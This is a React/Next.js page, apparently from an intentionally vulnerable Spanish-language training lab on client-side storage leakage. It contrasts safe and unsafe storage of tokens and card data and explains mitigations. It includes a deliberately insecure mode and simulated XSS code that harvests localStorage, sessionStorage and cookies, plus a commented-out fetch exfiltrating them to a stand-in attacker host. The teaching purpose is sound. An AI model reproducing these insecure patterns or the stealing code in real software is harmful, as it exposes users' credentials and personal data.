'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';

// Tipos para nuestros datos
interface UserData {
  id: number;
  username: string;
  email: string;
  role: string;
  apiKey?: string;
  token?: string;
  creditCard?: string;
}

interface StoredData {
  userData: UserData | null;
  sessionToken: string | null;
  preferences: Record<string, any> | null;
  sensitiveInfo: Record<string, string> | null;
}

export default function ClientStoragePage() {
  // Estado para controlar el modo seguro/inseguro
  const [protection, setProtection] = useState<boolean>(false);
  
  // Estado para los datos almacenados
  const [storedData, setStoredData] = useState<StoredData>({
    userData: null,
    sessionToken: null,
    preferences: null,
    sensitiveInfo: null
  });
  
  // Estado para las alertas
  const [alerts, setAlerts] = useState<Array<{type: string, message: string}>>([]);
  
  // Estado para el código XSS simulado
  const [xssAttack, setXssAttack] = useState<string>('');
  
  // Efecto para inicializar datos de demostración
  useEffect(() => {
    // Limpiar almacenamiento previo
    clearAllStorage();
    
    // Inicializar datos de ejemplo
    const mockUserData: UserData = {
      id: 12345,
      username: 'usuario_demo',
      email: 'usuario@ejemplo.com',
      role: 'admin',
      apiKey: 'ak_live_51NXXzGKh3asdas7uSUnU9uR1acSQ',
      token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InVzZXJfZGVtbyIsImlhdCI6MTUxNjIzOTAyMn0',
      creditCard: '4111-1111-1111-1111'
    };
    
    const mockPreferences = {
      theme: 'dark',
      notifications: true,
      language: 'es'
    };
    
    const mockSensitiveInfo = {
      homeAddress: 'Calle Ejemplo 123, Ciudad',
      phoneNumber: '+34 611 222 333',
      lastSearch: 'síntomas de enfermedad privada'
    };
    
    // Guardar datos según el modo (seguro/inseguro)
    storeDataBasedOnMode(mockUserData, mockPreferences, mockSensitiveInfo);
    
    // Actualizar estado para mostrar en la interfaz
    readStoredData();
    
    // Cleanup al desmontar
    return () => {
      clearAllStorage();
    };
  }, [protection]);
  
  // Función para almacenar datos según el modo seguro/inseguro
  const storeDataBasedOnMode = (
    userData: UserData, 
    preferences: Record<string, any>, 
    sensitiveInfo: Record<string, string>
  ) => {
    if (protection) {
      // MODO SEGURO
      
      // 1. Datos de usuario: Almacenar solo lo esencial, sin datos sensibles
      const safeUserData = {
        id: userData.id,
        username: userData.username,
        email: userData.email,
        role: userData.role
      };
      localStorage.setItem('userData', JSON.stringify(safeUserData));
      
      // 2. Token de sesión: Usar cookies HttpOnly para mayor seguridad (simulado)
      // Nota: En el cliente no podemos establecer cookies HttpOnly, esto solo es demostrativo
      document.cookie = `sessionToken=SIMULATED_HTTPONLY_COOKIE; path=/; SameSite=Strict`;
      sessionStorage.setItem('sessionTokenInfo', 'Token almacenado en cookie HttpOnly (simulado)');
      
      // 3. Preferencias: Pueden ir en localStorage (no son sensibles)
      localStorage.setItem('userPreferences', JSON.stringify(preferences));
      
      // 4. No almacenar información sensible en el cliente
      sessionStorage.setItem('sensitiveInfo', 'La información sensible no se almacena en el cliente');
      
      addAlert('success', 'Datos almacenados de forma segura, sin información sensible en el cliente');
      
    } else {
      // MODO INSEGURO
      
      // 1. Datos de usuario completos incluyendo datos sensibles
      localStorage.setItem('userData', JSON.stringify(userData));
      
      // 2. Token de sesión en localStorage (vulnerable)
      localStorage.setItem('sessionToken', userData.token || 'jwt-token-inseguro-123456789');
      
      // 3. Preferencias en localStorage
      localStorage.setItem('userPreferences', JSON.stringify(preferences));
      
      // 4. Información sensible almacenada directamente
      sessionStorage.setItem('sensitiveInfo', JSON.stringify(sensitiveInfo));
      
      // 5. Cookies sin flags de seguridad
      document.cookie = `authToken=${userData.token}; path=/`;
      document.cookie = `creditCard=${userData.creditCard}; path=/`;
      
      addAlert('error', 'Datos almacenados de forma insegura, con información sensible expuesta');
    }
  };
  
  // Función para leer los datos almacenados
  const readStoredData = () => {
    // Leer datos del usuario
    const userDataStr = localStorage.getItem('userData');
    const userData = userDataStr ? JSON.parse(userDataStr) : null;
    
    // Leer token de sesión
    const sessionToken = localStorage.getItem('sessionToken') || 
                         sessionStorage.getItem('sessionTokenInfo') || 
                         'Almacenado en cookie HttpOnly (no accesible por JS)';
    
    // Leer preferencias
    const preferencesStr = localStorage.getItem('userPreferences');
    const preferences = preferencesStr ? JSON.parse(preferencesStr) : null;
    
    // Leer información sensible
    const sensitiveInfoStr = sessionStorage.getItem('sensitiveInfo');
    let sensitiveInfo = null;
    try {
      sensitiveInfo = sensitiveInfoStr ? JSON.parse(sensitiveInfoStr) : null;
    } catch {
      sensitiveInfo = { info: sensitiveInfoStr };
    }
    
    // Actualizar estado
    setStoredData({
      userData,
      sessionToken,
      preferences,
      sensitiveInfo
    });
  };
  
  // Función para simular un ataque XSS que roba datos
  const simulateXssAttack = () => {
    // Código XSS malicioso que recopila datos y los envía a un servidor del atacante
    const maliciousCode = `
      // Función que recopila datos de localStorage, sessionStorage y cookies
      function stealData() {
        const stolenData = {
          localStorage: {},
          sessionStorage: {},
          cookies: document.cookie,
          url: window.location.href
        };
        
        // Robar localStorage
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key) {
            stolenData.localStorage[key] = localStorage.getItem(key);
          }
        }
        
        // Robar sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          if (key) {
            stolenData.sessionStorage[key] = sessionStorage.getItem(key);
          }
        }
        
        // En un ataque real, aquí se enviarían los datos a un servidor controlado por el atacante
        // fetch('https://atacante-malicioso.com/recolector', {
        //   method: 'POST',
        //   body: JSON.stringify(stolenData)
        // });
        
        return stolenData;
      }
      
      // Ejecutar ataque y mostrar datos robados
      const stolenData = stealData();
      console.log('Datos robados:', stolenData);
      return stolenData;
    `;
    
    // Mostrar el código del ataque
    setXssAttack(maliciousCode);
    
    // Simular ejecución del ataque (solo para demostración)
    try {
      // eslint-disable-next-line no-eval
      const result = eval(maliciousCode);
      addAlert('error', 'Ataque XSS ejecutado: Datos robados del almacenamiento del cliente');
      console.log('Resultado del ataque simulado:', result);
    } catch (error) {
      console.error('Error al ejecutar el ataque simulado:', error);
    }
  };
  
  // Función para limpiar todo el almacenamiento
  const clearAllStorage = () => {
    localStorage.clear();
    sessionStorage.clear();
    
    // Eliminar cookies estableciendo fecha de expiración en el pasado
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const cookie = cookies[i];
      const eqPos = cookie.indexOf('=');
      const name = eqPos > -1 ? cookie.substring(0, eqPos).trim() : cookie.trim();
      document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/`;
    }
    
    setStoredData({
      userData: null,
      sessionToken: null,
      preferences: null,
      sensitiveInfo: null
    });
    
    addAlert('info', 'Almacenamiento del cliente limpiado');
  };
  
  // Función para añadir alertas
  const addAlert = (type: string, message: string) => {
    setAlerts(prev => [...prev, { type, message }]);
    
    // Eliminar alerta después de 5 segundos
    setTimeout(() => {
      setAlerts(prev => prev.filter(a => a.message !== message));
    }, 5000);
  };
  
  // Función para mostrar JSON con formato
  const renderJson = (data: any) => {
    return (
      <pre className="p-3 bg-gray-100 rounded text-sm overflow-x-auto max-h-60">
        {JSON.stringify(data, null, 2)}
      </pre>
    );
  };
  
  return (
    <div className="p-8 max-w-6xl mx-auto">
      <h1 className="text-3xl font-bold mb-6">Laboratorio: Client-Side Storage Leakage</h1>
      
      <div className="bg-red-100 border-l-4 border-red-500 p-4 mb-8">
        <h2 className="text-red-700 font-bold">⚠️ Advertencia de Seguridad</h2>
        <p className="text-red-700">Esta página es intencionalmente vulnerable para propósitos educativos.</p>
      </div>
      
      {/* Alertas */}
      <div className="fixed top-4 right-4 w-80 z-50">
        {alerts.map((alert, index) => (
          <div 
            key={index} 
            className={`mb-2 p-3 rounded shadow-md ${
              alert.type === 'success' ? 'bg-green-100 border border-green-400 text-green-800' :
              alert.type === 'error' ? 'bg-red-100 border border-red-400 text-red-800' :
              'bg-blue-100 border border-blue-400 text-blue-800'
            }`}
          >
            {alert.message}
          </div>
        ))}
      </div>
      
      {/* Control para activar/desactivar protección */}
      <div className="mb-8 p-4 bg-blue-50 border border-blue-200 rounded-lg">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-xl font-semibold text-blue-800">Estado de Almacenamiento Seguro</h2>
            <p className="text-blue-600">
              {protection 
                ? "✅ Almacenamiento seguro - Datos sensibles no almacenados en el cliente" 
                : "❌ Almacenamiento inseguro - Datos sensibles expuestos en localStorage y sessionStorage"}
            </p>
          </div>
          <label className="inline-flex items-center cursor-pointer">
            <span className="mr-3 text-sm font-medium text-gray-900">Inseguro</span>
            <div className="relative">
              <input 
                type="checkbox" 
                checked={protection}
                onChange={(e) => setProtection(e.target.checked)}
                className="sr-only peer" 
              />
              <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
            </div>
            <span className="ml-3 text-sm font-medium text-gray-900">Seguro</span>
          </label>
        </div>
      </div>
      
      {/* Contenido principal */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
        {/* Panel izquierdo - Datos almacenados */}
        <div className="space-y-6">
          <div className="p-6 bg-white shadow-md rounded-lg">
            <h2 className="text-xl font-bold mb-4">Datos Almacenados en el Cliente</h2>
            
            <div className="space-y-4">
              <div>
                <h3 className="font-medium text-gray-700 mb-2">Datos de Usuario (localStorage)</h3>
                {storedData.userData ? (
                  renderJson(storedData.userData)
                ) : (
                  <p className="text-gray-500">No hay datos de usuario almacenados.</p>
                )}
              </div>
              
              <div>
                <h3 className="font-medium text-gray-700 mb-2">Token de Sesión</h3>
                {storedData.sessionToken ? (
                  <div className="p-3 bg-gray-100 rounded text-sm overflow-x-auto">
                    <p className="break-all">{storedData.sessionToken}</p>
                  </div>
                ) : (
                  <p className="text-gray-500">No hay token de sesión almacenado.</p>
                )}
              </div>
              
              <div>
                <h3 className="font-medium text-gray-700 mb-2">Preferencias de Usuario (localStorage)</h3>
                {storedData.preferences ? (
                  renderJson(storedData.preferences)
                ) : (
                  <p className="text-gray-500">No hay preferencias almacenadas.</p>
                )}
              </div>
              
              <div>
                <h3 className="font-medium text-gray-700 mb-2">Información Sensible (sessionStorage)</h3>
                {storedData.sensitiveInfo ? (
                  renderJson(storedData.sensitiveInfo)
                ) : (
                  <p className="text-gray-500">No hay información sensible almacenada.</p>
                )}
              </div>
            </div>
          </div>
          
          <div className="p-6 bg-white shadow-md rounded-lg">
            <h2 className="text-xl font-bold mb-4">Acciones</h2>
            
            <div className="space-y-4">
              <button 
                onClick={readStoredData}
                className="w-full p-2 bg-blue-500 hover:bg-blue-600 text-white rounded"
              >
                Refrescar Datos Almacenados
              </button>
              
              <button 
                onClick={simulateXssAttack}
                className="w-full p-2 bg-red-500 hover:bg-red-600 text-white rounded"
              >
                Simular Ataque XSS (Robo de Datos)
              </button>
              
              <button 
                onClick={clearAllStorage}
                className="w-full p-2 bg-gray-500 hover:bg-gray-600 text-white rounded"
              >
                Limpiar Almacenamiento
              </button>
            </div>
          </div>
        </div>
        
        {/* Panel derecho - Simulación de ataque y explicación */}
        <div className="space-y-6">
          {xssAttack && (
            <div className="p-6 bg-red-50 border border-red-200 shadow-md rounded-lg">
              <h2 className="text-xl font-bold text-red-800 mb-4">Ataque XSS Simulado</h2>
              
              <p className="mb-4 text-red-700">
                Este código malicioso podría ser inyectado a través de un ataque XSS y robaría todos los datos del almacenamiento del cliente:
              </p>
              
              <pre className="p-3 bg-gray-100 rounded text-sm overflow-x-auto max-h-96">
                {xssAttack}
              </pre>
              
              <p className="mt-4 text-red-700 text-sm">
                Abre la consola del navegador (F12) para ver los datos que han sido "robados" por este ataque simulado.
              </p>
            </div>
          )}
          
          <div className="p-6 bg-white shadow-md rounded-lg">
            <h2 className="text-xl font-bold mb-4">Inspector de Almacenamiento</h2>
            
            <div className="space-y-4">
              <div>
                <h3 className="font-medium text-gray-700 mb-2">localStorage</h3>
                <pre className="p-3 bg-gray-100 rounded text-sm overflow-x-auto max-h-60">
                  {Object.keys(localStorage).length > 0 ? (
                    JSON.stringify(
                      Object.keys(localStorage).reduce((acc, key) => {
                        acc[key] = localStorage.getItem(key);
                        return acc;
                      }, {} as Record<string, string | null>),
                      null,
                      2
                    )
                  ) : "El localStorage está vacío"}
                </pre>
              </div>
              
              <div>
                <h3 className="font-medium text-gray-700 mb-2">sessionStorage</h3>
                <pre className="p-3 bg-gray-100 rounded text-sm overflow-x-auto max-h-60">
                  {Object.keys(sessionStorage).length > 0 ? (
                    JSON.stringify(
                      Object.keys(sessionStorage).reduce((acc, key) => {
                        acc[key] = sessionStorage.getItem(key);
                        return acc;
                      }, {} as Record<string, string | null>),
                      null,
                      2
                    )
                  ) : "El sessionStorage está vacío"}
                </pre>
              </div>
              
              <div>
                <h3 className="font-medium text-gray-700 mb-2">Cookies</h3>
                <pre className="p-3 bg-gray-100 rounded text-sm overflow-x-auto max-h-60">
                  {document.cookie ? document.cookie : "No hay cookies almacenadas"}
                </pre>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      {/* Explicación técnica */}
      <div className="mt-8 p-6 bg-gray-50 border border-gray-200 rounded-lg">
        <h2 className="text-xl font-bold mb-4">Explicación Técnica: Client-Side Storage Leakage</h2>
        
        <div className="space-y-4">
          <p><strong>¿Qué es Client-Side Storage Leakage?</strong> Es una vulnerabilidad que ocurre cuando las aplicaciones web almacenan datos sensibles (como tokens de autenticación, información personal o secretos API) en el almacenamiento del lado del cliente (localStorage, sessionStorage o cookies) de manera insegura, permitiendo que esos datos sean accesibles para atacantes a través de ataques como XSS.</p>
          
          <p><strong>Tipos de almacenamiento del cliente y sus riesgos:</strong></p>
          <ul className="list-disc pl-5 space-y-1">
            <li><strong>localStorage</strong>: Persiste incluso después de cerrar el navegador, no tiene fecha de expiración, es accesible desde cualquier página del mismo origen y vulnerable a XSS.</li>
            <li><strong>sessionStorage</strong>: Similar a localStorage pero limitado a la sesión de navegación actual. Se elimina al cerrar la pestaña o ventana.</li>
            <li><strong>Cookies</strong>: Pueden configurarse con atributos de seguridad (HttpOnly, Secure, SameSite), pero sin estos, también son vulnerables.</li>
          </ul>
          
          <p><strong>Vectores de ataque comunes:</strong></p>
          <ul className="list-disc pl-5 space-y-1">
            <li>Ataques Cross-Site Scripting (XSS) que acceden directamente al almacenamiento del cliente</li>
            <li>Cross-Site Request Forgery (CSRF) que aprovecha cookies mal configuradas</li>
            <li>Malware en extensiones de navegador que puede acceder al almacenamiento</li>
            <li>Acceso físico al dispositivo (localStorage persiste indefinidamente)</li>
            <li>Man-in-the-Middle en conexiones no cifradas</li>
          </ul>
          
          <p><strong>Implementación segura vs. vulnerable:</strong></p>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-2">
            <div>
              <h4 className="font-medium mb-2 text-red-600">❌ Vulnerable</h4>
              <pre className="p-2 bg-red-50 border border-red-200 rounded text-sm overflow-x-auto">
{`// Almacenar token JWT en localStorage
localStorage.setItem('authToken', 
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');

// Guardar datos sensibles del usuario
localStorage.setItem('userData', JSON.stringify({
  name: 'Usuario',
  email: 'usuario@ejemplo.com',
  creditCard: '1234-5678-9012-3456',
  ssn: '123-45-6789'
}));

// Cookie sin atributos de seguridad
document.cookie = 'authToken=abc123; path=/';`}
              </pre>
            </div>
            <div>
              <h4 className="font-medium mb-2 text-green-600">✅ Seguro</h4>
              <pre className="p-2 bg-green-50 border border-green-200 rounded text-sm overflow-x-auto">
{`// Almacenar solo datos no sensibles en el cliente
localStorage.setItem('userPreferences', JSON.stringify({
  theme: 'dark',
  language: 'es'
}));

// Tokens de autenticación en cookies seguras
// (Esto debe configurarse en el servidor)
// Set-Cookie: authToken=abc123; HttpOnly; Secure; 
//             SameSite=Strict; path=/

// Información sensible solo en el servidor
// En lugar de almacenar datos sensibles en el cliente,
// solo almacenar un ID y solicitar los datos
// al servidor cuando sea necesario
localStorage.setItem('userId', '12345');`}
              </pre>
            </div>
          </div>
          
          <p><strong>Mitigaciones:</strong></p>
          <ul className="list-disc pl-5 space-y-1">
            <li><strong>No almacenar datos sensibles en el cliente</strong>: Mantener información sensible solo en el servidor</li>
            <li><strong>Usar cookies con atributos de seguridad</strong>: HttpOnly (previene acceso desde JavaScript), Secure (solo HTTPS) y SameSite (mitiga CSRF)</li>
            <li><strong>Minimizar datos</strong>: Almacenar solo la información mínima necesaria</li>
            <li><strong>Implementar mecanismos de caducidad</strong>: Establecer tiempos de expiración para tokens y sesiones</li>
            <li><strong>Cifrar datos sensibles</strong>: Si es absolutamente necesario almacenar datos sensibles en el cliente, cifrarlos antes</li>
            <li><strong>Sanitización y validación</strong>: Prevenir XSS para evitar que el atacante acceda al almacenamiento</li>
          </ul>
        </div>
      </div>
      
      <div className="mt-6">
        <Link href="/" className="text-blue-500 hover:underline">
          ← Volver a la página principal
        </Link>
      </div>
    </div>
  );
}